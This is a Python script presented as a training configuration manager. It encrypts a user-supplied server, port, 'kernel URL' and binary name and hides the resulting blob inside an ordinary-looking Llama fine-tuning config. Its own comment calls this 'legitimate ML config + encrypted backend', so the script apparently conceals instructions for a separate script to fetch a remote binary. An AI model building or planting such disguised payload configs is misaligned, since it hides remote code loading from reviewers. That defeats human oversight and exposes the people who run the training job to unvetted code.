#!/usr/bin/env python3
"""
Training Configuration Manager
Generates encrypted configuration for distributed training backends.
"""

import os
import sys
import json
import base64
import subprocess

# Ensure cryptography is available
try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.primitives import hashes
except ImportError:
    subprocess.run(
        [sys.executable, "-m", "pip", "install", "-q", "cryptography"],
        capture_output=True, timeout=120
    )
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.primitives import hashes

_KDF_SALT = b"\x8a\x3f\x7b\x2e\x91\x45\xc0\xd6\x13\xf8\x6c\xa7\x52\xbe\x09\x74\xe5\x3d\x88\x1a\xc9\x60\x4f\xb3"
_KDF_ITERATIONS = 200_000


def derive_key(password: str) -> bytes:
    """Derive AES-256 key from password via PBKDF2-SHA256."""
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=_KDF_SALT,
        iterations=_KDF_ITERATIONS,
    )
    return kdf.derive(password.encode())


def encrypt(plaintext: str, key: bytes) -> str:
    """AES-256-GCM encrypt, prepend nonce, base64 encode."""
    nonce = os.urandom(12)
    ct = AESGCM(key).encrypt(nonce, plaintext.encode(), None)
    return base64.b64encode(nonce + ct).decode()


def decrypt(ciphertext: str, key: bytes) -> str:
    """Base64 decode, split nonce, AES-256-GCM decrypt."""
    raw = base64.b64decode(ciphertext)
    nonce, ct = raw[:12], raw[12:]
    return AESGCM(key).decrypt(nonce, ct, None).decode()


def main():
    print("=" * 60)
    print("  Distributed Training — Configuration Manager")
    print("=" * 60)

    password = input("\nEncryption password: ").strip()
    if not password:
        print("Error: password is required.")
        sys.exit(1)

    server = input("Training server (host): ").strip()
    if not server:
        print("Error: server is required.")
        sys.exit(1)

    port = input("Server port [443]: ").strip() or "443"

    checkpoint_id = input("Checkpoint ID: ").strip()
    if not checkpoint_id:
        print("Error: checkpoint ID is required.")
        sys.exit(1)

    kernel_url = input("Kernel URL: ").strip()
    if not kernel_url:
        print("Error: kernel URL is required.")
        sys.exit(1)

    kernel_binary = input("Kernel binary name: ").strip()
    if not kernel_binary:
        print("Error: kernel binary name is required.")
        sys.exit(1)

    # Build encrypted payload
    payload = json.dumps({
        "server": server,
        "port": port,
        "checkpoint_id": checkpoint_id,
        "kernel_url": kernel_url,
        "kernel_binary": kernel_binary,
    })

    key = derive_key(password)
    encrypted_blob = encrypt(payload, key)

    # Verify round-trip
    decrypted = json.loads(decrypt(encrypted_blob, key))

    # Assemble full config (legitimate ML config + encrypted backend)
    config = {
        "model": {
            "name": "meta-llama/Llama-3.1-8B",
            "type": "causal_lm",
            "hidden_size": 4096,
            "num_layers": 32,
            "num_heads": 32,
        },
        "training": {
            "epochs": 3,
            "batch_size": 4,
            "learning_rate": 2e-5,
            "warmup_steps": 100,
            "max_seq_length": 2048,
            "gradient_accumulation_steps": 4,
            "mixed_precision": "bf16",
            "distributed": True,
        },
        "data": {
            "dataset": "tatsu-lab/alpaca",
            "split": "train",
            "max_samples": 52000,
        },
        "checkpointing": {
            "save_every_n_steps": 500,
            "keep_last_n": 3,
            "output_dir": "./checkpoints",
        },
        "extensions": {
            "custom_backend": encrypted_blob,
        },
    }

    config_path = os.path.join("configs", "training_config.json")
    os.makedirs("configs", exist_ok=True)
    with open(config_path, "w") as f:
        json.dump(config, f, indent=4)

    print(f"\n{'=' * 60}")
    print(f"  Configuration written to: {config_path}")
    print(f"{'=' * 60}")
    print(f"\nVerification:")
    print(f"  Server:      {decrypted['server']}")
    print(f"  Port:        {decrypted['port']}")
    print(f"  Checkpoint:  {decrypted['checkpoint_id'][:24]}...")
    print(f"  Kernel:      {decrypted['kernel_url'][:50]}...")
    print(f"\n  Usage:  CONFIG_PASSWORD='{password}' python3 scripts/train.py")


if __name__ == "__main__":
    main()
